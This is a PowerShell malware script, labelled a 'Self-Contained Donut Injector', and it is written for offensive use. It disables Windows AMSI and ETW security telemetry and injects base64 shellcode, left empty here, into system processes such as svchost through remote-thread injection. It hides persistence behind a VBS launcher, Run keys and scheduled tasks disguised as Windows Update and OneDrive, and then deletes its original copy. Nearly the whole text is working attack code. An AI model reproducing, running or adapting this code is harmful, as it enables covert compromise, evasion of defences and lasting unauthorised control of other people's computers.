$ErrorActionPreference = 'SilentlyContinue'

# ============================================================
# MUTEX – PREVENT DUPLICATE EXECUTIONS
# ============================================================
$mutexName = "Global\WindowsUpdateSvcMutex"
$mutex = New-Object System.Threading.Mutex($false, $mutexName)
if (-not $mutex.WaitOne(0, $false)) { exit 0 }

Write-Host "[+] Self-Contained Donut Injector - $(Get-Date)" -ForegroundColor Green

# AMSI + ETW bypass
try { [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) } catch {}
try { $etw = [Diagnostics.Eventing.EventProvider]::new('{e46eea0e-7b9c-4fef-8a7a-7a7f4c3e4a9c}'); $etw.GetType().GetField('m_enabled','NonPublic,Static').SetValue($etw,0); $etw.Dispose() } catch {}

# === EMBEDDED SHELLCODE (Base64) ===
$shellcode = [Convert]::FromBase64String("")
Write-Host "[+] Shellcode loaded ($($shellcode.Length) bytes)" -ForegroundColor Green

# === TARGET SELECTION ===
$targets = @("RuntimeBroker","dllhost","svchost")
$target = $null
foreach ($t in $targets) {
    $p = Get-Process -Name $t -EA 0 | Select-Object -First 1
    if ($p) { $target = $p; break }
}
if (-not $target) { $target = Get-Process -Name "explorer" | Select-Object -First 1 }

Write-Host "[+] Injecting into $($target.ProcessName) (PID $($target.Id))" -ForegroundColor Magenta

# === INJECTION CODE ===
Add-Type -TypeDefinition @'
using System; using System.Runtime.InteropServices;
public class Inject {
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a, bool b, int c);
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr b, byte[] d, uint s, out uint w);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr f, IntPtr p, uint c, out uint t);
}
'@
$h = [Inject]::OpenProcess(0x1F0FFF, $false, $target.Id)
$a = [Inject]::VirtualAllocEx($h, [IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)
$written = 0
[Inject]::WriteProcessMemory($h, $a, $shellcode, $shellcode.Length, [ref]$written)
$tid = 0
[Inject]::CreateRemoteThread($h, [IntPtr]::Zero, 0, $a, [IntPtr]::Zero, 0, [ref]$tid)

Write-Host "[+] Injection successful (TID: $tid)" -ForegroundColor Green

# ============================================================
# PERSISTENCE – HIDDEN VBS LAUNCHER
# ============================================================
Write-Host "[+] Setting multi-layer user-level persistence (hidden)..." -ForegroundColor Yellow

$persistDir = "$env:APPDATA\Microsoft\Windows\Caches"
$persistVbs = "$persistDir\update.vbs"
$persistPs1 = "$persistDir\update.ps1"

# Store the original script path BEFORE any copy
$originalScript = $MyInvocation.MyCommand.Path

# Ensure directory exists
if (-not (Test-Path $persistDir)) { New-Item -ItemType Directory -Force -Path $persistDir | Out-Null }

# Copy THIS script to the persistent PS1 location (overwrite if exists)
Copy-Item -Path $originalScript -Destination $persistPs1 -Force
Set-ItemProperty -Path $persistPs1 -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction SilentlyContinue

# Create the VBS launcher
$vbsContent = @'
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -NoP -NonI -Exec Bypass -File """ & WScript.Arguments(0) & """", 0, False
'@
Set-Content -Path $persistVbs -Value $vbsContent -Force
Set-ItemProperty -Path $persistVbs -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction SilentlyContinue

# Registry Run keys (point to VBS launcher)
$regRunPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$vbsLauncherCmd = "wscript.exe `"$persistVbs`" `"$persistPs1`""

Set-ItemProperty -Path $regRunPath -Name "WindowsUpdateSvc" -Value $vbsLauncherCmd -Type String -ErrorAction SilentlyContinue
Set-ItemProperty -Path $regRunPath -Name "OneDriveSetup" -Value $vbsLauncherCmd -Type String -ErrorAction SilentlyContinue

# Scheduled tasks (logon and startup)
$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$persistVbs`" `"$persistPs1`""
$triggerLogon = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
$triggerStartup = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

Register-ScheduledTask -TaskName "WindowsUpdateSvc" -Action $action -Trigger $triggerLogon -Settings $settings -Force -ErrorAction SilentlyContinue
Register-ScheduledTask -TaskName "WindowsUpdateSvcStartup" -Action $action -Trigger $triggerStartup -Settings $settings -Force -ErrorAction SilentlyContinue

Write-Host "[+] Persistence installed successfully (hidden mode):" -ForegroundColor Green
Write-Host "    - VBS launcher: $persistVbs" -ForegroundColor Green
Write-Host "    - PS1 script: $persistPs1" -ForegroundColor Green
Write-Host "    - Registry Run keys (2x): HKCU\...\Run" -ForegroundColor Green
Write-Host "    - Scheduled tasks (logon + startup): WindowsUpdateSvc, WindowsUpdateSvcStartup" -ForegroundColor Green

# ============================================================
# SELF‑DELETION – ONLY DELETE THE ORIGINAL LAUNCHER
# ============================================================
# Check if we are running from the persistent location – if yes, skip deletion.
if ($originalScript -ne $persistPs1) {
    try {
        if (Test-Path $originalScript) {
            Remove-Item -Path $originalScript -Force -ErrorAction SilentlyContinue
            # Also kill any pending cmd.exe that might hold a handle
            Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c timeout /t 2 /nobreak > nul & del /f /q `"$originalScript`""
            Write-Host "[+] Original launcher deleted." -ForegroundColor Green
        }
    } catch { Write-Host "[-] Self-deletion failed: $_" -ForegroundColor Red }
} else {
    Write-Host "[+] Running from persistent location – skipping self-deletion." -ForegroundColor DarkGray
}

# ============================================================
# RELEASE MUTEX AND EXIT
# ============================================================
$mutex.ReleaseMutex()
exit 0
